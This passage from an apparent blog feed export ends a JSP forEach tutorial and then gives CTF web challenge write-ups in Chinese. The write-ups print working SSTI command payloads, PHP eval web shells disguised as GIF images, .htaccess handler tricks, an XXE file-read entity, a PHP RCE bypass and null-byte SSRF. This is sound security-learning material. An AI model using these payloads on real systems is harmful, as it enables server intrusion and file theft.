</li>
<li><p>遍历容器</p>
<ul>
<li><p>属性：</p>
<ul>
<li><p>items:容器对象</p>
</li>
<li><p>var:容器中元素的临时变量</p>
</li>
<li><p>varStatus:循环状态对象</p>
<ul>
<li><p>index:容器中元素的索引从0开始</p>
</li>
<li><p>count:循环次数从1开始</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.ArrayList"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">import</span>=<span class="string">"java.util.List"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">isELIgnored</span>=<span class="string">"false"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"c"</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>foreach标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">foreach相当于Java代码的for循环</span></span><br><span class="line"><span class="xml">    1. 完成重复的操作</span></span><br><span class="line"><span class="xml">        for(int i=0;i<span class="tag">&lt;<span class="name">10;i++)</span></span></span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">            代码</span></span><br><span class="line"><span class="template-variable">        &#125;</span></span><br><span class="line"><span class="xml">        · 属性：</span></span><br><span class="line"><span class="xml">            begin:开始值</span></span><br><span class="line"><span class="xml">            end:结束值</span></span><br><span class="line"><span class="xml">            var:临时变量</span></span><br><span class="line"><span class="xml">            step:步长</span></span><br><span class="line"><span class="xml">            varStatus:循环状态对象</span></span><br><span class="line"><span class="xml">                index:容器中元素的索引从0开始</span></span><br><span class="line"><span class="xml">                count:循环次数从1开始</span></span><br><span class="line"><span class="xml">    2. 遍历容器</span></span><br><span class="line"><span class="xml">        List<span class="tag">&lt;<span class="name">User</span>&gt;</span> list;</span></span><br><span class="line"><span class="xml">        for(User user:list)</span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">            代码</span></span><br><span class="line"><span class="template-variable">        &#125;</span></span><br><span class="line"><span class="xml">        · 属性：</span></span><br><span class="line"><span class="xml">            items:容器对象</span></span><br><span class="line"><span class="xml">            var:容器中元素的临时变量</span></span><br><span class="line"><span class="xml">            varStatus:循环状态对象</span></span><br><span class="line"><span class="xml">                index:容器中元素的索引从0开始</span></span><br><span class="line"><span class="xml">                count:循环次数从1开始</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">begin</span>=<span class="string">"1"</span> <span class="attr">end</span>=<span class="string">"10"</span> <span class="attr">var</span>=<span class="string">"i"</span> <span class="attr">step</span>=<span class="string">"2"</span> <span class="attr">varStatus</span>=<span class="string">"s"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    $</span><span class="template-variable">&#123;i&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>$</span><span class="template-variable">&#123;s.index&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h3</span>&gt;</span> <span class="tag">&lt;<span class="name">h4</span>&gt;</span>$</span><span class="template-variable">&#123;s.count&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h4</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        List list=new ArrayList();</span></span><br><span class="line"><span class="xml">        list.add("aaa");</span></span><br><span class="line"><span class="xml">        list.add("bbb");</span></span><br><span class="line"><span class="xml">        list.add("ccc");</span></span><br><span class="line"></span><br><span class="line"><span class="xml">        request.setAttribute("list",list);</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"str"</span> <span class="attr">varStatus</span>=<span class="string">"s"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        $</span><span class="template-variable">&#123;s.index&#125;</span><span class="xml"> $</span><span class="template-variable">&#123;s.count&#125;</span><span class="xml"> $</span><span class="template-variable">&#123;str&#125;</span><span class="xml"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src="/img/JavaWeb/9-7学习日记/2.png" alt="avatar"></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Nepnep-WEB-3</title>
    <url>/2020/09/07/BUUCTF-Nepnep-WEB-3/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开之后查看一下Hint,在源码里看到提示</p>
<p>抓包，在flag.php中添加X-Forwarded-For头</p>
<p>发现IP可控，那就基本上是注入题了，常见的SQL注入试了一遍之后，发现没什么用，考虑模板注入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入：&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">结果：<span class="number">49</span></span><br></pre></td></tr></table></figure>
<p>可以确定是SSTI注入了</p>
<p>payload<br><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">X</span>-Forwarded-For: <span class="meta">&#123;system(</span><span class="string">"cat /flag"</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>打开是个上传，随便上传一个图片和PHP试试</p>
<p>上传PHP得到后缀名不能有ph！</p>
<p>所以可以确定ph是被ban掉了</p>
<p>和之前做过的题一样，试试图片马</p>
<p>上传.htaccess文件 类型改成image/jpeg</p>
<p><img src="/img/Nepnep/BabyUpload.png" alt="avatar"></p>
<p>接着上传图片马</p>
<p>要注意的是由于头不能为ph开头，所以用script来代替<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">'attack'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>得到路径访问一下,没问题用蚁剑连接</p>
<p>根目录得到flag</p>
<h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><p>打开代码审计，ban掉了很多东西，设置了个白名单，基本都是数学函数，限制了长度不能超过80</p>
<p>搜一下白名单里没见过的函数</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">base_convert</span>() 函数在任意进制之间转换数字  <span class="selector-tag">base_convert</span>(number,frombase,tobase);</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">decbin</span>() 函数把十进制转换为二进制</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">dechex</span>() 函数把十进制数转换为十六进制数</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">decoct</span>() 函数把十进制转换为八进制</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">deg2rad</span>() 函数将角度转换为弧度</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">hexdec</span>() 函数把十六进制转换为十进制</span><br></pre></td></tr></table></figure>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>有一个函数hex2bin，可以将16进制数转换为ascii，但是由于不在白名单内，所以要转换一下</p>
<p>由于只能使用数字，所以10进制是个选择，接着36进制可以包含数字和字符，所以将hex2bin进行转换<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt;hex2bin</span><br></pre></td></tr></table></figure></p>
<p>接着就是构建16进制数的_GET了<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">dechex</span><span class="params">(<span class="number">1598506324</span>)</span></span> =&gt;<span class="number">5</span>f474554</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">(<span class="string">"5f474554"</span>)</span></span> =&gt; _GET</span><br></pre></td></tr></table></figure><br>利用PHP的特性，构造payload</p>
<p>$$pi解析为$_GET,{}代替了[]，从而实现了rce</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="built-in">abs</span>&#125;)&amp;<span class="built-in">pi</span>=<span class="keyword">system</span>&amp;<span class="built-in">abs</span>=tac /flag</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>打开之后，查看Hint，并在Flag试一下模板注入</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; 回显<span class="number">7777777</span> ==&gt; Jinja2</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="number">7</span>*'<span class="number">7</span>'&#125;&#125; 回显<span class="number">49</span> ==&gt; Twig</span><br></pre></td></tr></table></figure>
<p>还是模板注入的问题<br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p>
<p>参考这篇文章<br>payload<br><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">"exec"</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">"cat /flag"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>打开之后，查看一下源码，发现是XML，考虑XXE<br>参考一下<br><a href="https://www.freebuf.com/vuls/175451.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/175451.html</a></p>
<p>构造一下外部实体攻击</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY admin SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;admin;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Nepnep</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Nepnep-WEB-2</title>
    <url>/2020/08/21/BUUCTF-Nepnep-WEB-2/</url>
    <content><![CDATA[<h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开之后是个登陆界面，还以为是一个SQL注入，尝试了一下万能密码，发现进去了是个欢迎界面</p>
<p>没办法了，用dirsearch扫一下目录<br><img src="/img/Nepnep/假猪套天下第一0.png" alt="avatar"></p>
<p>发现了/.DS_Store文件泄露</p>
<p>直接URL访问得到了DS_Store文件，用dsstore工具利用一下<br><img src="/img/Nepnep/假猪套天下第一1.png" alt="avatar"><br>发现了几个PHP文件和一些CSS</p>
<p>profile.php就是一个欢迎界面，index.php就是登录</p>
<p>所以访问一下L0g1n.php</p>
<p>提示了<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Sorry, <span class="keyword">this</span> site will be available after totally <span class="number">99</span> years!</span><br></pre></td></tr></table></figure></p>
<p>可以看到基本上考的是信息的伪造</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>信息伪造是比较常规的一种考法了</p>
<p>地址伪造:<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span></span><br></pre></td></tr></table></figure><br>代理地址伪造:<br><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">client</span>-<span class="built_in">ip</span></span><br></pre></td></tr></table></figure></p>
<p>网站伪造:<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Referer</span></span><br></pre></td></tr></table></figure><br>浏览器伪造:<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent</span><br></pre></td></tr></table></figure></p>
<p>日期伪造:<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">If-Unmodified-Since</span></span><br></pre></td></tr></table></figure></p>
<p>代理服务器伪造:<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Via</span></span><br></pre></td></tr></table></figure></p>
<p>邮箱伪造：<br><figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">From</span></span><br></pre></td></tr></table></figure></p>
<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>bp抓包，把时间后面加上好多0，大于99年即可<br><img src="/img/Nepnep/假猪套天下第一2.png" alt="avatar"></p>
<p>得到提示要本地访问<br>使用<code>X-Forwarded-For:127.0.0.1</code></p>
<p>结果发现被ban掉了，所以用client_ip试试<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">client-ip:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></p>
<p>又说要从gem-love.com访问，所以就伪造<br><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Referer:</span>gem-love.com</span><br></pre></td></tr></table></figure><br>得到提示要从Commodo 64访问，不知道是什么，百度了一下，发现有一个手提电脑叫Commodore<br>试了一下<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">User-Agent:Commodore <span class="number">64</span></span><br></pre></td></tr></table></figure><br>还要邮箱伪造<br><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">From</span>:root<span class="variable">@gem-love</span>.com</span><br></pre></td></tr></table></figure><br>看到proxy，代理服务器伪造<br><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">Via:</span>y1ng.vip</span><br></pre></td></tr></table></figure><br>最后得到一串base64，解码得到flag</p>
<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开就是源码<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><br>审计了一下，使用了flask框架，还用了os</p>
<p>看到index()中有一个 open(__file__).read()</p>
<p>接着看shrine，发现了用正则和replace过滤掉了一些东西</p>
<p>不知道什么操作，去看了一下WP，发现是之前学到过的模板注入</p>
<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><p>模板注入在之前地fake google就做过，基本上了解啦</p>
<p>这里涉及两个函数<br><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line">url_for</span><br><span class="line">(<span class="number">1</span>)给指定的函数构造 URL。</span><br><span class="line">(<span class="number">2</span>)访问静态文件(CSS / JavaScript 等)。 只要在你的包中或是模块的所在目录中创建一个名为 static 的文件夹，在应用中使用 /static 即可访问</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">get_flashed_messages</span><span class="params">()</span>  顾名思义，意思大概就是取值</span></span><br></pre></td></tr></table></figure></p>
<h2 id="测试过程-1"><a href="#测试过程-1" class="headerlink" title="测试过程"></a>测试过程</h2><p>访问/shrine</p>
<p>先验证有没有模板注入<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;<span class="number">2</span>+<span class="number">2</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure></p>
<p>验证了有模板注入</p>
<p>payload<br><figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[<span class="string">'current_app'</span>].<span class="built_in">config</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">shrine/&#123;&#123;get_flashed_messages.__globals__[<span class="string">'current_app'</span>].<span class="built_in">config</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到flag</p>
<p>这个地方，想用之前的模板注入<br><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><br>但是是空的</p>
<p>()又被ban了，所以没有办法正常回显</p>
<p>之后又用这个url_for和get_flashed_messages去尝试了一下之前的模板注入，发现完全可行，这里记录一下，学到了学到了</p>
<h1 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h1><p>看提示是一个cve-2020-7066</p>
<p>百度一下，看到这篇文章<br><a href="https://blog.csdn.net/weixin_45485719/article/details/106432960" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45485719/article/details/106432960</a></p>
<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>在PHP7.3版本中使用<code>get_headers()</code>会截断URL中空字符后的内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// user input</span></span></span><br><span class="line"><span class="php">$_GET[<span class="string">'url'</span>] = <span class="string">"http://localhost\0.example.com"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$host = parse_url($_GET[<span class="string">'url'</span>], PHP_URL_HOST);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">'.example.com'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$headers = get_headers($_GET[<span class="string">'url'</span>]);</span></span><br><span class="line"><span class="php">var_dump($headers);</span></span><br></pre></td></tr></table></figure>
<p>结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">headers <span class="keyword">from</span> http:<span class="comment">//localhost</span></span><br></pre></td></tr></table></figure></p>
<h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>点击连接，发现出现了<code>?url=http://www.ctfhub.com</code></p>
<p>F12查看一下，在Header中得到提示<br>Flag in localhost</p>
<p>按照刚才文章中的方法，使用%00截断</p>
<p>构造payload<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.1%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure><br>又得到一个提示，Host must be end with ‘123’</p>
<p>修改一下<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?url=http:<span class="comment">//127.0.0.123%00www.ctfhub.com</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>打开是个上传界面，先上传一个PHP，被ban了很正常，修改Content-type发现没有什么用，修改PHP后缀名也没有用</p>
<p>PHP花式后缀<br><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">phtml</span><br><span class="line">phps</span><br><span class="line">phpt</span><br></pre></td></tr></table></figure><br>查一下WP</p>
<p>发现是上传.htaccess文件来解析图片🐎</p>
<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>百度得到的意思解析是<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">.htaccess文件(或者<span class="string">"分布式配置文件"</span>）,全称是Hypertext <span class="keyword">Access</span>(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。</span><br></pre></td></tr></table></figure><br>就是apache服务器的配置文件</p>
<p>接着又看到了.htaccess文件上传的文章<br><a href="https://www.jianshu.com/p/c674904a711e" target="_blank" rel="noopener">https://www.jianshu.com/p/c674904a711e</a></p>
<h4 id="常见姿势一"><a href="#常见姿势一" class="headerlink" title="常见姿势一"></a>常见姿势一</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FileMatch 参数即为文件名的正则匹配</span></span><br><span class="line"><span class="section">&lt;FilesMatch "sniperoj"&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sniperoj</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="常见姿势二"><a href="#常见姿势二" class="headerlink" title="常见姿势二"></a>常见姿势二</h4><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// filename.jpg</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="常见姿势三"><a href="#常见姿势三" class="headerlink" title="常见姿势三"></a>常见姿势三</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自解析的 .htaccess</span></span><br><span class="line"><span class="section">&lt;Files "\.htaccess"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Files&gt;</span></span><br><span class="line"><span class="section">&lt;FilesMatch "\.htaccess"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="comment"># &lt;?php eval($_GET[c]);?&gt;</span></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"><span class="comment"># 不过这种方式测试并没有成功... 暂时不清楚原因</span></span><br></pre></td></tr></table></figure>
<h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>上传.htaccess文件,但是这里由于Content-Type只接受image/jpeg<br><img src="/img/Nepnep/你传你马呢0.png" alt="avatar"></p>
